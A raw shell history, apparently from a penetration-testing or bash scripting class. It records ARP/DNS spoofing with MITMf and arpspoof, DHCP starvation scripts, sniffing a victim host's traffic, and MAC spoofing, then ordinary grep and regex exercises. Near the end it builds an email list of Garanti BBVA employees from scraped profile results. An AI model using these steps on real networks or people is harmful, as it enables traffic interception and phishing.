+  770  ./mitmf.py  -i eth0 --gateway 192.168.33.1 --target 192.168.33.0/24  --arp --spoof --dns
+  771  bg
+  772  fg
+  773  ./mitmf.py  -i eth0 --gateway 192.168.33.1 --target 192.168.33.28  --arp --spoof --dns
+  774  dmesg 
+  775  msfconsole 
+  776  ls -l
+  777  rm -rf 1 
+  778  rm -rf http.pcap 
+  779  less dhcp_starvation.sh 
+  780  rm -rf dhcp_starvation.sh 
+  781  ls -l
+  782  chmod 755 gonder.py 
+  783  ./gonder.py 
+  784  vi gonder.py 
+  785  ./gonder.py 
+  786  cat gonder.py 
+  787  vi gonder.py 
+  788  cat gonder.py 
+  789  ./gonder.py 
+  790  ping google.com
+  791  dhclient eth0 
+  792  ./gonder.py 
+  793  rm -rf gonder.py 
+  794  ls -l
+  795  rm -rf http.pcap 
+  796  dhclient eth0 -v
+  797  ls -l
+  798  ./dhcp_exhaust.sh 
+  799  ./dhcp_exhaust.sh eth0 3
+  800  journalctl  -xe
+  801  /etc/init.d/network-manager stop
+  802  pkill dhclient
+  803  ./dhcp_exhaust.sh eth0 3
+  804  hostname pentest
+  805  ifconfig 
+  806  route -n
+  807  netstat -nlput
+  808  tcpdump -tttnn -i eth0 port 67
+  809  vi config/mitmf.conf 
+  810  /usr/sbin/tor
+  811  ifconfig 
+  812  pkill dhclient
+  813  ifconfig  eth0
+  814  ./dhcp_exhaust.sh  eth0 2
+  815  ifconfig  eth0
+  816  msfconsole 
+  817  ifconfig 
+  818  iwconfig 
+  819  ifconfig  -a
+  820  dmesg 
+  821  lsmod  | grep ath
+  822  rmmod  ath9k_htc
+  823  lsmod  | grep ath
+  824  rmmod  ath9k_common
+  825  rmmod  ath9k_hw
+  826  lsmod  | grep ath
+  827  modprobe ath9k_common
+  828  modprobe ath9k_hw
+  829  modprobe ath9k_htc
+  830  lsmod  | grep ath
+  831  dmesg 
+  832  ifconfig 
+  833  ifconfig  -a
+  834  iwconfig 
+  835  dmesg 
+  836  lsmod  | grep ath
+  837  ls -al /lib/firmware/htc_9271.fw
+  838  dhclient eth0 -v
+  839  apt-get clean all; apt-get update; apt-get install firmware-linux -y
+  840  ifconfig 
+  841  ifconfig  -a
+  842  iwconfig 
+  843  dmesg 
+  844  ifconfig  -a
+  845  iwconfig 
+  846  iwconfig wlan0 mode monitor
+  847  ifconfig 
+  848  iwconfig 
+  849  ifconfig 
+  850  ifconfig  -a
+  851  dhclient et0 -v
+  852  dhclient eth0 -v
+  853  ifconfig 
+  854  ifconfig  eth0 down
+  855  macchanger  -r eth0 
+  856  dhclient eth0 -v
+  857  ifconfig  eth0 up
+  858  dhclient eth0 -v
+  859  ./dhcp_starvation.sh --help
+  860  ./dhcp_starvation.sh eth0 5
+  861  setoolkit 
+  862  ls -l
+  863  rm -rf 1 tmp ftp.pcap  gonderbeni.txt  http.pcap 
+  864  ls -l
+  865  dhclient eth0 -v
+  866  pkill dhclient
+  867  ifconfig 
+  868  dhclient eth0 -v
+  869  ifconfig 
+  870  route -n
+  871  sysctl  -a | grep forward
+  872  sysctl -w net.ipv4.ip_forward=1
+  873  ifconfig 
+  874  sysctl -w net.ipv4.ip_forward=1
+  875  ifconfig 
+  876  arpspoof  -i eth0 -t 172.26.1.190 172.26.1.1
+  877  tcpdump -tttnn -i eth0 host 172.26.1.190 -s 0 -w http.pcap
+  878  wireshark  http.pcap 
+  879  tcpdump -tttnn -i eth0 host 172.26.1.190 -s 0 -w http.pcap
+  880  wireshark  http.pcap 
+  881  tcpdump -tttnn -i eth0 host 172.26.1.190 -s 0 -w http.pcap
+  882  rm -rf http.pcap 
+  883  tcpdump -tttnn -i eth0 host 172.26.1.190 -s 0 -w http.pcap
+  884  wireshark  http.pcap 
+  885  tcpdump -tttnn -i eth0 host 172.26.1.190 -s 0 -w http.pcap
+  886  sysctl  -a | grep forward
+  887  sysctl  -w net.ipv4.ip_forward=1
+  888  tcpdump -tttnn -i eth0 host 172.26.1.190 -s 0 -w http.pcap
+  889  ./dhcp_exhaust.sh -i eth0 3
+  890  ./dhcp_exhaust.sh eth0 3
+  891  dhclient eth0 -v
+  892  ./dhcp_exhaust.sh eth0 3
+  893  pkill dhclient
+  894  ifconfig  eth0 
+  895  macchanger  -r eth0 
+  896  dhclient eth0 
+  897  ifconfig eth0
+  898  hostname pentest
+  899  netstat -nlput
+  900  tcpdump -tttnn -i eth0 port 67
+  901  sysctl  -a | grep forward
+  902  iptables -L -n
+  903  iptables -L -n -t nat
+  904  iptables --flush -t nat
+  905  iptables -L -n -t nat
+  906  tcpdump -tttnn -i eth0 port 67
+  907  ps -ef | grep mimt
+  908  ps -ef | grep mitm
+  909  kill -9 9335
+  910  ifconfig 
+  911  pkill dhclient
+  912  ifconfig 
+  913  /etc/init.d/network-manager restart
+  914  ifconfig 
+  915  ifconfig  -a
+  916  iwconfig 
+  917  /etc/init.d/network-manager restart
+  918  ifconfig 
+  919  /etc/init.d/network-manager restart
+  920  ifconfig 
+  921  iwconfig 
+  922  ifconfig 
+  923  iwconfig 
+  924  /etc/init.d/apache2 start
+  925  ifconfig 
+  926  vi gonder.py
+  927  tcpdump -tttnn -i eth0 port 80 -s 0 
+  928  tcpdump -tttnn -i lo port 80 -s 0 
+  929  tcpdump -tttnn -i lo port 80 -s 0 -w http.pcap
+  930  wireshark  http.pcap 
+  931  vi gonder.py 
+  932  tcpdump -tttnn -i eth0 port 80 -s 0 -w http.pcap
+  933  wireshark  http.pcap 
+  934  /etc/init.d/network-manager restart
+  935  ifconfig 
+  936  ifconfig  -a
+  937  iwconfig 
+  938  dmesg 
+  939  ifconfig  -a
+  940  iwconfig 
+  941  /etc/init.d/network-manager restart
+  942  /etc/init.d/network-manager stop
+  943  /etc/init.d/network-manager start
+  944  dmesg 
+  945  ifconfig -a
+  946  iwconfig 
+  947  shutdown -r now
+  948  cd ..
+  949  /etc/init.d/network-manager stop
+  950  ifconfig 
+  951  route -n
+  952  ls -l
+  953  rm -rf 1 
+  954  ./dhcp_exhaust.sh 
+  955  ./dhcp_exhaust.sh eth0 3
+  956  dhclient eth0 -v
+  957  ifconfig  eth0 
+  958  ifconfig 
+  959  ifconfig  eth0 
+  960  macchanger  -r eth0 
+  961  dhclient eth0 
+  962  hostname pentest
+  963  ping hurriyet.com.tr
+  964  tcpdump -tttnn -i eth0 port 443 and host 34.249.120.252 -s 0 -w sample.pcap
+  965  tcpdump -tttnn -i eth0 port 443 and host 34.249.120.252 and proto TCP -s 0 -w sample.pcap
+  966  tcpdump -tttnn -r sample.pcap 
+  967  mv sample.pcap  /var/www/html/
+  968  cd /var/www/html/
+  969  ls -la
+  970  tcpdump -tttnn -r sample.pcap  -c 10 
+  971  tcpdump -tttnn -r sample.pcap  -c 20 | more 
+  972  tcpdump -tttnn -r sample.pcap  | more
+  973  tcpdump -tttnn -r sample.pcap  | less
+  974  tcpdump -tttnn -r sample.pcap  
+  975  tcpdump -tttnn -r sample.pcap -c 20 
+  976  tcpdump -tttnn -r sample.pcap -c 20 | cut -d ">" -f2
+  977  tcpdump -tttnn -r sample.pcap -c 20 | cut -d ">" -f2 | cut -d " " -f1
+  978  tcpdump -tttnn -r sample.pcap -c 20 | cut -d ">" -f2 | cut -d " " -f2
+  979  tcpdump -tttnn -r sample.pcap -c 20 | cut -d ">" -f2 
+  980  tcpdump -tttnn -r sample.pcap -c 20 | cut -d ">" -f2 | cut -d " " -f2
+  981  tcpdump -tttnn -r sample.pcap -c 20 | cut -d ">" -f2 | cut -d " " -f2 | tr -d ":" 
+  982  tcpdump -tttnn -r sample.pcap -c 20 | cut -d ">" -f2 | cut -d " " -f2 | tr -d ":"  | sort -n | uniq -c
+  983  tcpdump -tttnn -r sample.pcap  | cut -d ">" -f2 | cut -d " " -f2 | tr -d ":"  | sort -n | uniq -c
+  984  tcpdump -tttnn -r sample.pcap  -c 20 | cut -d ">" -f1
+  985  tcpdump -tttnn -r sample.pcap  -c 20 | cut -d ">" -f1 
+  986  tcpdump -tttnn -r sample.pcap  -c 20 | cut -d ">" -f1  | awk -F " " '{print $3}'
+  987  tcpdump -tttnn -r sample.pcap  -c 20 | cut -d ">" -f1  | awk -F " " '{print $3}' | cut -d "." -f1-3
+  988  tcpdump -tttnn -r sample.pcap  -c 20 | cut -d ">" -f1  | awk -F " " '{print $3}' | cut -d "." -f1-4
+  989  geoiplookup
+  990  geoiplookup 54.29.9.120
+  991  geoiplookup 54.29.9.120 | cut -d ":" -f2
+  992  geoiplookup 54.29.9.120 | cut -d ":" -f2 | cut -d " " -f2
+  993  geoiplookup 54.29.9.120 | cut -d ":" -f2 | cut -d " " -f2 | tr -d ","
+  994  tcpdump -tttnn -r sample.pcap  -c 20 | cut -d ">" -f1  | awk -F " " '{print $3}' | cut -d "." -f1-4
+  995  tcpdump -tttnn -r sample.pcap  -c 20 | cut -d ">" -f1  | awk -F " " '{print $3}' | cut -d "." -f1-4 | while read ip; do geoiplookup $ip | cut -d ":" -f2 | cut -d " " -f2 | tr -d ","; done
+  996  tcpdump -tttnn -r sample.pcap  -c 20 | cut -d ">" -f1  | awk -F " " '{print $3}' | cut -d "." -f1-4 | while read ip; do geoiplookup $ip | cut -d ":" -f2 | cut -d " " -f2 | tr -d ","; done | sort -n | uniq -c | sort -n
+  997  tcpdump -tttnn -r sample.pcap  -c 20 | cut -d ">" -f1  | awk -F " " '{print $3}' | cut -d "." -f1-4 | while read ip; do geoiplookup $ip | cut -d ":" -f2 | cut -d " " -f2 | tr -d ","; done | sort -n | uniq -c | sort -nr
+  998  vi script1.sh
+  999  cat script1.sh 
+ 1000  chmod 755 script1.sh 
+ 1001  ./script1.sh 
+ 1002  vi script1.sh 
+ 1003  cat script1.sh 
+ 1004  ./script1.sh 
+ 1005  ./script1.sh  | sort -n | uniq -c | sort -nr
+ 1006  cat script1.sh 
+ 1007  tcpdump -tttnn -r sample.pcap  -c 40 
+ 1008  cat script1.sh 
+ 1009  ps -ef | grep ssh 
+ 1010  ps -ef | grep ssh  | while read pid; do kill -9 $pid 2>/dev/null ; done
+ 1011  ps -ef | grep ssh 
+ 1012  ps -ef | grep ssh  
+ 1013  ps -ef | grep ssh   | awk '{print $2}' | while read pid; do kill -9 $pid 2>/dev/null ; done
+ 1014  ps -ef | grep ssh  
+ 1015  echo "deneme"
+ 1016  echo "deneme" | sed -e "s/e/E/g"
+ 1017  echo "deneme" > test.txt
+ 1018  cat test.txt 
+ 1019  cat test.txt | sed -e "s/e/E/g" > test.txt2; rm -rf test.txt; mv test.txt2 test.txt 
+ 1020  cat test.txt 
+ 1021  history  >> history1.txt 
+ 1022  head -10 /etc/passwd
+ 1023  grep ":0:" /etc/passwd
+ 1024  grep ":0:" /etc/passwd | wc -l
+ 1025  vi /etc/passwd
+ 1026  grep -i test /etc/passwd
+ 1027  grep test /etc/passwd
+ 1028  vi /etc/passwd
+ 1029  grep -i test /etc/passwd
+ 1030  vi /etc/passwd
+ 1031  grep -i test /etc/passwd
+ 1032  grep test /etc/passwd
+ 1033  grep -iR test /etc/* 2>/dev/null 
+ 1034  grep -iRHn "*test*" /etc/ 2>/dev/null | head -5  
+ 1035  ps -ef | grep ssh 
+ 1036  ps -ef | grep ssh  | grep -v grep
+ 1037  cat dosya 
+ 1038  grep bcd dosya 
+ 1039  grep -A1 bcd dosya 
+ 1040  grep bcd dosya 
+ 1041  grep -A2 bcd dosya 
+ 1042  grep -A2 -B1 bcd dosya 
+ 1043  echo "http://www.bga.com.tr" | grep bga
+ 1044  echo "http://www.bga.com.tr" | grep -q bga
+ 1045  echo $?
+ 1046  echo "http://www.bga.com.tr" | grep -q ssdsdd
+ 1047  echo $?
+ 1048  echo "http://www.bga.com.tr" | grep -Eq "^https?://"
+ 1049  echo "http://www.bga.com.tr" | grep -E "^https?://"
+ 1050  echo "https://www.bga.com.tr" | grep -E "^https?://"
+ 1051  echo "httpd://www.bga.com.tr" | grep -E "^https?://"
+ 1052  echo "httpd://www.bga.com.tr" | grep -E "^(http|ftp)s?://"
+ 1053  echo "https://www.bga.com.tr" | grep -E "^(http|ftp)s?://"
+ 1054  echo "http://www.bga.com.tr" | grep -E "^(http|ftp)s?://"
+ 1055  echo "ftp://www.bga.com.tr" | grep -E "^(http|ftp)s?://"
+ 1056  echo "ftps://www.bga.com.tr" | grep -E "^(http|ftp)s?://"
+ 1057  arp-scan -l -I eth- 
+ 1058  arp-scan -l -I eth0
+ 1059  arp-scan -l -I eth0 | grep -E "^[0-9]"
+ 1060  arp-scan -l -I eth0 | grep -E "^[0-9]" | head -5
+ 1061  arp-scan -l -I eth0 | grep -Eo "^[0-9]" | head -5
+ 1062  arp-scan -l -I eth0 | grep -E "^([0-9]{1,3}\.){3}" 
+ 1063  arp-scan -l -I eth0 | grep -Eo "^([0-9]{1,3}\.){3}" 
+ 1064  arp-scan -l -I eth0 | head -10  
+ 1065  arp-scan -l -I eth0 | grep -Eo "^([0-9]{1,3}\.){3}" | head -5 
+ 1066  arp-scan -l -I eth0 | grep -Eo "^([0-9]{1,3}\.){3}[0-9]{1,3}\s+" | head -5 
+ 1067  arp-scan -l -I eth0 | grep -Eo "^([0-9]{1,3}\.){3}[0-9]{1,3}\s+[a-f-A-F0-9]{2}:" | head -5 
+ 1068  arp-scan -l -I eth0 | grep -Eo "^([0-9]{1,3}\.){3}[0-9]{1,3}\s+[a-fA-F0-9]{2}:" | head -5 
+ 1069  arp-scan -l -I eth0 | grep -Eo "^([0-9]{1,3}\.){3}[0-9]{1,3}\s+([a-fA-F0-9]{2}:){5}" | head -5 
+ 1070  arp-scan -l -I eth0 | grep -Eo "^([0-9]{1,3}\.){3}[0-9]{1,3}\s+([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}\s+" | head -5 
+ 1071  arp-scan -l -I eth0 | grep -Eo "^([0-9]{1,3}\.){3}[0-9]{1,3}\s+([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}\s+.*" | head -5 
+ 1072  arp-scan -l -I eth0 | grep -Eo "^([0-9]{1,3}\.){3}[0-9]{1,3}\s+([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}\s+.*" | awk '{print $1}'
+ 1073  find / -iname "*passwd*" -type f -size -10m  2>/dev/null 
+ 1074  find / -iname "*passwd*" -type f -size -10  2>/dev/null 
+ 1075  find / -iname "*passwd*" -type f -size -10  -exec grep -EHni "root:" {} \; 
+ 1076  find / -iname "*passwd*" -type f -size -10  -exec du -dh  {} \; 
+ 1077  find / -iname "*passwd*" -type f -size -10  -exec du -sh  {} \; 
+ 1078  find / -iname "*passwd*" -type f -size -10  -exec du -sh  {} \;  | head -4 
+ 1079  find / -iname "*passwd*" -type f -size -10  -exec grep -EiHn "[a-zA-Z0-9]+:x:0:[0-9]+"  {} \; 
+ 1080  find / -iname "*passwd*" -type f -size -10  -exec grep -EiHn "[a-zA-Z0-9]+:x:0:[0-9]+"  {} \;  | wc -l
+ 1081  ls -l
+ 1082  ls -li
+ 1083  find . -inum 1715931
+ 1084  find . -inum 1715931 -delete
+ 1085  ls -li
+ 1086  for count in {1..10}; do echo "$count"; done
+ 1087  vi script2.sh 
+ 1088  cat script2.sh 
+ 1089  vi tmp
+ 1090  cat tmp 
+ 1091  vi tmp
+ 1092  cat tmp 
+ 1093  cat tmp  | grep -E "^https?://"
+ 1094  cat tmp  | grep -A1 -E "^https?://"
+ 1095  cat tmp  | grep -A1 -E "^https?://" | grep -v http
+ 1096  cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -v "-"
+ 1097  cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-"
+ 1098  cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -E "^Garanti BBVA"
+ 1099  cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA"
+ 1100  cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA" | cut -d "-" -f1
+ 1101  cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA" | cut -d "-" -f1 | tr [A-Z] [a-z]
+ 1102  cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA" | cut -d "-" -f1 | tr [A-Z] [a-z] | grep -v "linkedin"
+ 1103  cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA" | cut -d "-" -f1 | tr [A-Z] [a-z] | grep -v "linkedin" | sed -e "s/ş/s/g" | sed -e "s/ğ/g/g" | sed -e "s/ç/c/g" | sed -e "s/ı/i/g" | sed -e "s/ö/o/g" | sed -e "s/ü/u/g" | sed -e "s/Ş/s/g" 
+ 1104  cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA" | cut -d "-" -f1 | tr [A-Z] [a-z] | grep -v "linkedin" | sed -e "s/ş/s/g" | sed -e "s/ğ/g/g" | sed -e "s/ç/c/g" | sed -e "s/ı/i/g" | sed -e "s/ö/o/g" | sed -e "s/ü/u/g" | sed -e "s/Ş/s/g" sed -e "s/Ç/c/g" |
+ 1105  cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA" | cut -d "-" -f1 | tr [A-Z] [a-z] | grep -v "linkedin" | sed -e "s/ş/s/g" | sed -e "s/ğ/g/g" | sed -e "s/ç/c/g" | sed -e "s/ı/i/g" | sed -e "s/ö/o/g" | sed -e "s/ü/u/g" | sed -e "s/Ş/s/g" sed -e "s/Ç/c/g" 
+ 1106  cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA" | cut -d "-" -f1 | tr [A-Z] [a-z] | grep -v "linkedin" | sed -e "s/ş/s/g" | sed -e "s/ğ/g/g" | sed -e "s/ç/c/g" | sed -e "s/ı/i/g" | sed -e "s/ö/o/g" | sed -e "s/ü/u/g" | sed -e "s/Ş/s/g" | sed -e "s/Ç/c/g" 
+ 1107  cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA" | cut -d "-" -f1 | tr [A-Z] [a-z] | grep -v "linkedin" | sed -e "s/ş/s/g" | sed -e "s/ğ/g/g" | sed -e "s/ç/c/g" | sed -e "s/ı/i/g" | sed -e "s/ö/o/g" | sed -e "s/ü/u/g" | sed -e "s/Ş/s/g" | sed -e "s/Ç/c/g"  | tr -s " " "."
+ 1108  cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA" | cut -d "-" -f1 | tr [A-Z] [a-z] | grep -v "linkedin" | sed -e "s/ş/s/g" | sed -e "s/ğ/g/g" | sed -e "s/ç/c/g" | sed -e "s/ı/i/g" | sed -e "s/ö/o/g" | sed -e "s/ü/u/g" | sed -e "s/Ş/s/g" | sed -e "s/Ç/c/g"  | tr -s " " "." | sed -e "s/\.//g"
+ 1109  cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA" | cut -d "-" -f1 | tr [A-Z] [a-z] | grep -v "linkedin" | sed -e "s/ş/s/g" | sed -e "s/ğ/g/g" | sed -e "s/ç/c/g" | sed -e "s/ı/i/g" | sed -e "s/ö/o/g" | sed -e "s/ü/u/g" | sed -e "s/Ş/s/g" | sed -e "s/Ç/c/g"  | tr -s " " "." | sed -e "s/\.$//g"
+ 1110  cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA" | cut -d "-" -f1 | tr [A-Z] [a-z] | grep -v "linkedin" | sed -e "s/ş/s/g" | sed -e "s/ğ/g/g" | sed -e "s/ç/c/g" | sed -e "s/ı/i/g" | sed -e "s/ö/o/g" | sed -e "s/ü/u/g" | sed -e "s/Ş/s/g" | sed -e "s/Ç/c/g"  | tr -s " " "." | sed -e "s/\.$//g" | head -10 
+ 1111  cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA" | cut -d "-" -f1 | tr [A-Z] [a-z] | grep -v "linkedin" | sed -e "s/ş/s/g" | sed -e "s/ğ/g/g" | sed -e "s/ç/c/g" | sed -e "s/ı/i/g" | sed -e "s/ö/o/g" | sed -e "s/ü/u/g" | sed -e "s/Ş/s/g" | sed -e "s/Ç/c/g"  | tr -s " " "." | sed -e "s/\.$//g" | while read -r line; do echo "$line@garantibbva.com.tr"; don; e; cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA" | cut -d "-" -f1 | tr [A-Z] [a-z] | grep -v "linkedin" | sed -e "s/ş/s/g" | sed -e "s/ğ/g/g" | sed -e "s/ç/c/g" | sed -e "s/ı/i/g" | sed -e "s/ö/o/g" | sed -e "s/ü/u/g" | sed -e "s/Ş/s/g" | sed -e "s/Ç/c/g"  | tr -s " " "." | sed -e "s/\.$//g" | while read -r line; do echo "$line@garantibbva.com.tr"; done
+ 1112  cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA" | cut -d "-" -f1 | tr [A-Z] [a-z] | grep -v "linkedin" | sed -e "s/ş/s/g" | sed -e "s/ğ/g/g" | sed -e "s/ç/c/g" | sed -e "s/ı/i/g" | sed -e "s/ö/o/g" | sed -e "s/ü/u/g" | sed -e "s/Ş/s/g" | sed -e "s/Ç/c/g"  | tr -s " " "." | sed -e "s/\.$//g" | while read -r line; do echo "$line@garantibbva.com.tr"; don; e; cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA" | cut -d "-" -f1 | tr [A-Z] [a-z] | grep -v "linkedin" | sed -e "s/ş/s/g" | sed -e "s/ğ/g/g" | sed -e "s/ç/c/g" | sed -e "s/ı/i/g" | sed -e "s/ö/o/g" | sed -e "s/ü/u/g" | sed -e "s/Ş/s/g" | sed -e "s/Ç/c/g"  | tr -s " " "." | sed -e "s/\.$//g" 
+ 1113  cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA" | cut -d "-" -f1 | tr [A-Z] [a-z] | grep -v "linkedin" | sed -e "s/ş/s/g" | sed -e "s/ğ/g/g" | sed -e "s/ç/c/g" | sed -e "s/ı/i/g" | sed -e "s/ö/o/g" | sed -e "s/ü/u/g" | sed -e "s/Ş/s/g" | sed -e "s/Ç/c/g"  | tr -s " " "." | sed -e "s/\.$//g" | while read -r line; do echo "$line@garantibbva.com.tr"; don; e; cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA" | cut -d "-" -f1 | tr [A-Z] [a-z] | grep -v "linkedin" | sed -e "s/ş/s/g" | sed -e "s/ğ/g/g" | sed -e "s/ç/c/g" | sed -e "s/ı/i/g" | sed -e "s/ö/o/g" | sed -e "s/ü/u/g" | sed -e "s/Ş/s/g" | sed -e "s/Ç/c/g"  | tr -s " " "." 
+ 1114  cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA" | cut -d "-" -f1 | tr [A-Z] [a-z] | grep -v "linkedin" | sed -e "s/ş/s/g" | sed -e "s/ğ/g/g" | sed -e "s/ç/c/g" | sed -e "s/ı/i/g" | sed -e "s/ö/o/g" | sed -e "s/ü/u/g" | sed -e "s/Ş/s/g" | sed -e "s/Ç/c/g"  | tr -s " " "." | sed -e "s/\.$//g" | while read -r line; do echo "$line@garantibbva.com.tr"; don; e; cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA" | cut -d "-" -f1 | tr [A-Z] [a-z] | grep -v "linkedin" | sed -e "s/ş/s/g" | sed -e "s/ğ/g/g" | sed -e "s/ç/c/g" | sed -e "s/ı/i/g" | sed -e "s/ö/o/g" | sed -e "s/ü/u/g" | sed -e "s/Ş/s/g" | sed -e "s/Ç/c/g"  
+ 1115  cat tmp  | grep -A1 -E "^https?://" | grep -v http | grep -Ev "^-" | grep -Ev "^Garanti BBVA" | cut -d "-" -f1 | tr [A-Z] [a-z] | grep -v "linkedin" | sed -e "s/ş/s/g" | sed -e "s/ğ/g/g" | sed -e "s/ç/c/g" | sed -e "s/ı/i/g" | sed -e "s/ö/o/g" | sed -e "s/ü/u/g" | sed -e "s/Ş/s/g" | sed -e "s/Ç/c/g"  | tr -s " " "." | sed -e "s/\.$//g" | while read -r line; do echo "$line@garantibbva.com.tr"; done
+ 1116  ls -l
+ 1117  cat tmp 
+ 1118  cat tmp | head -10 
+ 1119  cat tmp | grep -E "^https?:/" | head -10 
+ 1120  cat tmp | grep -A1 -E "^https?:/" | head -10 
+ 1121  cat tmp | grep -A1 -E "^https?:/" | grep -Ev "^(https?://|-)" 
+ 1122  cat tmp | grep -A1 -E "^https?:/" | grep -Evi "^(https?://|-|linkedin)" 
+ 1123  cat tmp | grep -A1 -E "^https?:/" | grep -Ev "^(https?://|-|LinkedIn)" 
+ 1124  cat tmp | grep -A1 -E "^https?:/" | grep -Ev "^(https?://|-|Garanti)" 
+ 1125  cat tmp | grep -A1 -E "^https?:/" | grep -Ev "^(https?://|-|Garanti)"  | cut -d "-" -f1
+ 1126  cat tmp | grep -A1 -E "^https?:/" | grep -Ev "^(https?://|-|Garanti)"  | cut -d "-" -f1 | tr [A-Z] [a-z]
+ 1127  cat tmp | grep -A1 -E "^https?:/" | grep -Ev "^(https?://|-|Garanti)"  | cut -d "-" -f1 | tr [A-Z] [a-z] | tr -s " " "."
+ 1128  cat tmp | grep -A1 -E "^https?:/" | grep -Ev "^(https?://|-|Garanti)"  | cut -d "-" -f1 | tr [A-Z] [a-z] | tr -s " " "." | head -5
+ 1129  cat tmp | grep -A1 -E "^https?:/" | grep -Ev "^(https?://|-|Garanti)"  | cut -d "-" -f1 | tr [A-Z] [a-z] | tr -s " " "." | sed -e "s/\.$//g" | head -5
+ 1130  cat tmp | grep -A1 -E "^https?:/" | grep -Ev "^(https?://|-|Garanti)"  
+ 1131  cat tmp | grep -A1 -E "^https?:/" | grep -Ev "^(https?://|-|Garanti)"   | head -5
+ 1132  cat tmp | grep -A1 -E "^https?:/" | grep -Ev "^(https?://|-|Garanti)"  | cut -d "-" -f1 | tr [A-Z] [a-z] | tr -s " " "." | sed -e "s/\.$//g" | head -5
+ 1133  cat tmp | grep -A1 -E "^https?:/" | grep -Ev "^(https?://|-|Garanti)"  | cut -d "-" -f1 | tr [A-Z] [a-z] | tr -s " " "." | sed -e "s/\.$//g" | sed -e "s/ç/c/g" | while read -r line; do echo "$line@garantibbva.com.tr"; done
+ 1134  cat tmp | grep -A1 -E "^https?:/" | grep -Ev "^(https?://|-|Garanti)"  | cut -d "-" -f1 | tr [A-Z] [a-z] | tr -s " " "." | sed -e "s/\.$//g" | sed -e "s/(ç|ı)/(c|i)/g" 
+ 1135  cat tmp | grep -A1 -E "^https?:/" | grep -Ev "^(https?://|-|Garanti)"  | cut -d "-" -f1 | tr [A-Z] [a-z] | tr -s " " "." | sed -e "s/\.$//g" | sed -e "s/ç/c/g"| head -5 
+ 1136  chmod 755 pinger.sh 
+ 1137  ./pinger.sh 
+ 1138  echo $?
+ 1139  ./pinger.sh dfsdf
+ 1140  echo $?
+ 1141  ./pinger.sh dfsdf zfzfdf
+ 1142  ./pinger.sh 
+ 1143  ./pinger.sh dfsdf
+ 1144  ./pinger.sh 10.10.15.0/24
+ 1145  ./pinger.sh dfsdf asdads
+ 1146  ./pinger.sh 12121212
+ 1147  ./pinger.sh dfsdf asdads
+ 1148  echo $?
+ 1149  ./pinger.sh 12121212
+ 1150  echo $?
+ 1151  ./pinger.sh 10.10.15.0/24
+ 1152  echo $?
+ 1153  ./pinger.sh 10.10.15.0/24
+ 1154  arp -an
+ 1155  ping --help
+ 1156  ping -c 1 -w 1 10.10.15.229 
+ 1157  ping -c 1 -w 1 10.10.15.230
+ 1158  ping -c 1 -w 1 10.10.15.231
+ 1159  ping -c 1 -w 1 10.10.15.123
+ 1160  ./pinger.sh 10.10.15.0/24
+ 1161  ping 10.10.15.40
+ 1162  ping 10.10.15.41
+ 1163  history  >> history1.txt 
